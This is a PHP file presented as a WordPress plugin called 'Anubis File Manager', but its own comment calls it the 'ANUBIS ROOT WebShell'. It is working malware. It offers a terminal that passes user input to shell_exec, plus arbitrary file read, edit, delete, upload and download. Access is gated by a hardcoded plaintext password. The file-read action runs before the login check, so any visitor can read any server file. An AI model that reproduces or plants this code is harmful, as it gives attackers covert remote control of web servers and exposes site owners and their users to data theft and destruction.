<?php
/*
Plugin Name: Anubis File Manager
Plugin URI: https://github.com/anubis
Description: Advanced file management system with security features
Version: 1.0.0
Author: Root Team
Author URI: https://github.com/anubis
License: GPL v2 or later
Text Domain: anubis
*/

// ANUBIS ROOT WebShell
session_start();

// Dosya okuma işlemi - en üstte olmalı
if (isset($_GET['action']) && $_GET['action'] == 'read' && isset($_GET['file'])) {
    $file = urldecode($_GET['file']);
    if (file_exists($file) && is_file($file)) {
        echo file_get_contents($file);
    } else {
        echo "Dosya bulunamadı! Dosya yolu: " . htmlspecialchars($file);
    }
    exit;
}

// Düz metin şifre kontrolü (test amaçlı)
$password = '440044';

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $password) {
            $_SESSION['auth'] = true;
        } else {
            $error = "Yanlış şifre!";
        }
    }

    if (!isset($_SESSION['auth'])) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>ANUBIS ROOT - Login</title>
            <style>
                body { font-family: 'Segoe UI', Arial; background: linear-gradient(135deg, #1a1a1a, #2d2d2d); color: #fff; text-align: center; padding: 50px; margin: 0; }
                .login-box { background: rgba(42, 42, 42, 0.9); padding: 40px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
                input[type="password"] { padding: 15px; margin: 15px; border: 2px solid #444; border-radius: 8px; background: #333; color: #fff; font-size: 16px; width: 200px; }
                input[type="submit"] { padding: 15px 30px; background: linear-gradient(45deg, #007cba, #005a8b); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
                input[type="submit"]:hover { background: linear-gradient(45deg, #005a8b, #007cba); }
                .error { color: #ff4444; margin: 15px 0; font-weight: bold; }
                h2 { color: #00ff88; text-shadow: 0 0 10px rgba(0,255,136,0.5); }
            </style>
        </head>
        <body>
            <div class="login-box">
                 <h2>ANUBIS ROOT</h2>
                <form method="post">
                    <input type="password" name="pass" placeholder="Şifre" required>
                    <br>
                    <input type="submit" value="Giriş">
                </form>
                <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout işlemi
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Dosya işlemleri
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'cmd':
            if (isset($_POST['cmd'])) {
                echo "<div class='result-box'>";
                echo "<h4>Komut: " . htmlspecialchars($_POST['cmd']) . "</h4>";
                echo "<pre class='cmd-output'>";
                echo htmlspecialchars(shell_exec($_POST['cmd']));
                echo "</pre></div>";
            }
            break;
            
        case 'edit':
            if (isset($_POST['file']) && isset($_POST['content'])) {
                $file = urldecode($_POST['file']);
                if (file_put_contents($file, $_POST['content'])) {
                    echo "<div class='success'>✅ Dosya kaydedildi: " . htmlspecialchars($file) . "</div>";
                    echo "<script>setTimeout(function(){ window.location.href = '?dir=" . urlencode(dirname($file)) . "'; }, 2000);</script>";
                } else {
                    echo "<div class='error'>❌ Dosya kaydedilemedi!</div>";
                }
            }
            break;
            
        case 'delete':
            if (isset($_GET['file'])) {
                $file = urldecode($_GET['file']);
                if (is_dir($file)) {
                    if (rmdir($file)) {
                        echo "<div class='success'>✅ Klasör silindi: " . htmlspecialchars($file) . "</div>";
    } else {
                        echo "<div class='error'>❌ Klasör silinemedi!</div>";
                    }
    } else {
                    if (unlink($file)) {
                        echo "<div class='success'>✅ Dosya silindi: " . htmlspecialchars($file) . "</div>";
    } else {
                        echo "<div class='error'>❌ Dosya silinemedi!</div>";
                    }
                }
            }
            break;
            
        case 'create_file':
            if (isset($_POST['filename']) && isset($_POST['path'])) {
                $filepath = $_POST['path'] . '/' . $_POST['filename'];
                if (file_put_contents($filepath, '') !== false) {
                    echo "<div class='success'>✅ Dosya oluşturuldu: " . htmlspecialchars($filepath) . "</div>";
                    echo "<script>setTimeout(function(){ window.location.href = '?dir=" . urlencode($_POST['path']) . "'; }, 2000);</script>";
                } else {
                    echo "<div class='error'>❌ Dosya oluşturulamadı!</div>";
                }
            }
            break;

        case 'create_dir':
            if (isset($_POST['dirname']) && isset($_POST['path'])) {
                $dirpath = $_POST['path'] . '/' . $_POST['dirname'];
                if (mkdir($dirpath)) {
                    echo "<div class='success'>✅ Klasör oluşturuldu: " . htmlspecialchars($dirpath) . "</div>";
                    echo "<script>setTimeout(function(){ window.location.href = '?dir=" . urlencode($_POST['path']) . "'; }, 2000);</script>";
                } else {
                    echo "<div class='error'>❌ Klasör oluşturulamadı!</div>";
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['file'])) {
                $uploadDir = $_POST['path'] ?? '.';
                $targetFile = $uploadDir . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
                    echo "<div class='success'>✅ Dosya yüklendi: " . htmlspecialchars($targetFile) . "</div>";
            } else {
                    echo "<div class='error'>❌ Yükleme başarısız!</div>";
                }
            }
            break;
            
        case 'download':
            if (isset($_GET['file'])) {
                $file = urldecode($_GET['file']);
                if (file_exists($file)) {
    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    readfile($file);
    exit;
}
            }
            break;
    }
}

// Dosya yöneticisi
$currentDir = $_GET['dir'] ?? '.';
$files = scandir($currentDir);
$parentDir = dirname($currentDir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>ANUBIS ROOT - Advanced File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial; 
            background: linear-gradient(135deg, #0f0f0f, #1a1a1a, #2d2d2d); 
            color: #fff; 
            min-height: 100vh;
        }
         .header { 
             background: linear-gradient(45deg, #1a1a1a, #2a2a2a); 
             padding: 20px; 
             border-radius: 15px; 
             margin: 20px; 
             box-shadow: 0 5px 20px rgba(0,0,0,0.3);
             border: 1px solid #333;
             position: relative;
         }
        .nav { 
            background: rgba(51, 51, 51, 0.8); 
            padding: 15px; 
            border-radius: 10px;
            margin: 20px; 
            backdrop-filter: blur(10px);
        }
        .nav a { 
            color: #00ff88; 
            text-decoration: none; 
            margin-right: 20px; 
            padding: 8px 15px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .nav a:hover { 
            background: rgba(0,255,136,0.2); 
            color: #fff;
        }
        .file-list { 
            background: rgba(42, 42, 42, 0.9); 
            padding: 20px; 
            border-radius: 15px; 
            margin: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid #333;
        }
        .file-item { 
            padding: 15px; 
            border-bottom: 1px solid #444; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            transition: all 0.3s;
            border-radius: 8px;
            margin: 5px 0;
        }
        .file-item:hover { 
            background: rgba(0,255,136,0.1); 
            transform: translateX(5px);
        }
        .file-actions {
            display: flex;
            gap: 10px;
        }
        .file-actions a {
            padding: 5px 10px;
            border-radius: 5px;
            text-decoration: none;
            font-size: 12px;
            transition: all 0.3s;
        }
        .edit-btn { background: #007cba; color: white; }
        .edit-btn:hover { background: #005a8b; }
        .delete-btn { background: #dc3545; color: white; }
        .delete-btn:hover { background: #c82333; }
        .download-btn { background: #28a745; color: white; }
        .download-btn:hover { background: #218838; }
        
        .cmd-box, .upload-box, .create-box { 
            background: rgba(42, 42, 42, 0.9); 
            padding: 20px; 
            border-radius: 15px; 
            margin: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid #333;
        }
        
        input, textarea, select { 
            background: #333; 
            color: #fff; 
            border: 2px solid #555; 
            padding: 10px; 
            border-radius: 8px; 
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus, textarea:focus, select:focus {
            border-color: #00ff88;
            outline: none;
            box-shadow: 0 0 10px rgba(0,255,136,0.3);
        }
        
        button { 
            background: linear-gradient(45deg, #007cba, #005a8b); 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: bold;
            transition: all 0.3s;
        }
        button:hover { 
            background: linear-gradient(45deg, #005a8b, #007cba);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,124,186,0.4);
        }
        
         .logout { 
             position: absolute;
             top: 20px;
             right: 20px;
         }
         .logout a {
             background: #dc3545;
             color: white;
             padding: 8px 15px;
             border-radius: 6px;
             text-decoration: none;
             font-size: 14px;
             transition: all 0.3s;
         }
         .logout a:hover {
             background: #c82333;
         }
        
        .success { 
            background: rgba(40, 167, 69, 0.2); 
            color: #28a745; 
            padding: 15px; 
            border-radius: 8px; 
            margin: 10px 0;
            border: 1px solid #28a745;
        }
        .error { 
            background: rgba(220, 53, 69, 0.2); 
            color: #dc3545; 
            padding: 15px; 
            border-radius: 8px; 
            margin: 10px 0;
            border: 1px solid #dc3545;
        }
        .result-box {
            background: rgba(42, 42, 42, 0.9);
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            border: 1px solid #333;
        }
        .cmd-output {
            background: #000;
            color: #00ff00;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
        }
        .path-info {
            background: rgba(0,255,136,0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            border: 1px solid #00ff88;
        }
        .file-icon {
            font-size: 20px;
            margin-right: 10px;
        }
        .file-size {
            color: #888;
            font-size: 12px;
        }
        .modal {
            display: none;
                                position: fixed;
                                z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
        }
        .modal-content {
            background: #2a2a2a;
            margin: 5% auto;
            padding: 20px;
            border-radius: 15px;
            width: 80%;
            max-width: 800px;
            border: 1px solid #333;
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover { color: #fff; }
        </style>
</head>
<body>
    <div class="header">
         <h1>ANUBIS ROOT - Advanced File Manager</h1>
        <div class="logout">
            <a href="?logout=1">Çıkış</a>
    </div>
        </div>
    
    <div class="nav">
        <a href="?">🏠 Ana Sayfa</a>
        <a href="?action=cmd">💻 Terminal</a>
        <a href="?action=upload">📤 Dosya Yükle</a>
        <a href="#" onclick="showCreateModal()">➕ Yeni Dosya/Klasör</a>
        <div class="path-info">
            <strong>📍 Mevcut Dizin: <?php echo htmlspecialchars($currentDir); ?></strong>
            </div>
            </div>
    
    <div class="file-list">
        <h3>📁 Dosyalar ve Klasörler:</h3>
        
        <?php if ($currentDir != '.'): ?>
            <div class="file-item">
                <span>
                    <span class="file-icon">⬆️</span>
                    <a href="?dir=<?php echo urlencode($parentDir); ?>" style="color: #00ff88; font-weight: bold;">.. (Üst Dizin)</a>
                </span>
                </div>
                <?php endif; ?>

                <?php foreach ($files as $file): ?>
            <?php if ($file != '.'): ?>
                <div class="file-item">
                    <span>
                        <?php if (is_dir($currentDir . '/' . $file)): ?>
                            <span class="file-icon">📁</span>
                            <a href="?dir=<?php echo urlencode($currentDir . '/' . $file); ?>" style="color: #00ff88; font-weight: bold;"><?php echo htmlspecialchars($file); ?></a>
                            <?php else: ?>
                            <span class="file-icon">📄</span>
                            <strong><?php echo htmlspecialchars($file); ?></strong>
                            <?php endif; ?>
                    </span>
                    <span>
                        <?php if (is_file($currentDir . '/' . $file)): ?>
                            <span class="file-size"><?php echo number_format(filesize($currentDir . '/' . $file)); ?> bytes</span>
                                <?php endif; ?>
                        <div class="file-actions">
                            <?php if (is_file($currentDir . '/' . $file)): ?>
                                <a href="#" onclick="editFile('<?php echo urlencode($currentDir . '/' . $file); ?>')" class="edit-btn">✏️ Düzenle</a>
                                <a href="?action=download&file=<?php echo urlencode($currentDir . '/' . $file); ?>" class="download-btn">⬇️ İndir</a>
                                <?php endif; ?>
                            <a href="?action=delete&file=<?php echo urlencode($currentDir . '/' . $file); ?>" class="delete-btn" onclick="return confirm('Emin misiniz?')">🗑️ Sil</a>
                            </div>
                    </span>
                </div>
            <?php endif; ?>
                <?php endforeach; ?>
</div>

    <div class="cmd-box">
        <h3>💻 Terminal Komutu:</h3>
        <form method="post" action="?action=cmd">
            <input type="text" name="cmd" placeholder="Komut girin (örn: ls -la, pwd, whoami)..." style="width: 70%;">
            <button type="submit">🚀 Çalıştır</button>
            </form>
</div>

    <div class="upload-box">
        <h3>📤 Dosya Yükle:</h3>
        <form method="post" action="?action=upload" enctype="multipart/form-data">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentDir); ?>">
            <input type="file" name="file" required style="width: 60%;">
            <button type="submit">⬆️ Yükle</button>
            </form>
</div>

    <!-- Modal for file editing -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeEditModal()">&times;</span>
            <h3>✏️ Dosya Düzenle</h3>
            <form method="post" action="?action=edit">
                <input type="hidden" id="editFile" name="file">
                <textarea id="editContent" name="content" rows="20" style="width: 100%; font-family: 'Courier New', monospace;"></textarea>
                <br><br>
                <button type="submit">💾 Kaydet</button>
                <button type="button" onclick="closeEditModal()">❌ İptal</button>
            </form>
    </div>
</div>

    <!-- Modal for creating files/folders -->
    <div id="createModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeCreateModal()">&times;</span>
            <h3>➕ Yeni Dosya/Klasör Oluştur</h3>
            <form method="post" action="?action=create_file">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentDir); ?>">
                <label>Dosya Adı:</label>
                <input type="text" name="filename" placeholder="ornek.txt" required>
                <button type="submit">📄 Dosya Oluştur</button>
            </form>
            <hr style="margin: 20px 0;">
            <form method="post" action="?action=create_dir">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentDir); ?>">
                <label>Klasör Adı:</label>
                <input type="text" name="dirname" placeholder="yeni_klasor" required>
                <button type="submit">📁 Klasör Oluştur</button>
            </form>
    </div>
</div>

<script>
        function editFile(filepath) {
            fetch('?action=read&file=' + encodeURIComponent(filepath))
                .then(response => response.text())
                .then(content => {
                    document.getElementById('editFile').value = filepath;
                    document.getElementById('editContent').value = content;
                    document.getElementById('editModal').style.display = 'block';
                })
                .catch(error => {
                    alert('Dosya okunamadı: ' + error);
                });
        }
        
        function closeEditModal() {
            document.getElementById('editModal').style.display = 'none';
        }
        
        function showCreateModal() {
            document.getElementById('createModal').style.display = 'block';
        }
        
        function closeCreateModal() {
            document.getElementById('createModal').style.display = 'none';
        }
        
        // Modal dışına tıklayınca kapat
        window.onclick = function(event) {
            const editModal = document.getElementById('editModal');
            const createModal = document.getElementById('createModal');
            if (event.target == editModal) {
                closeEditModal();
            }
            if (event.target == createModal) {
                closeCreateModal();
            }
        }
</script>
</body>
</html>

?>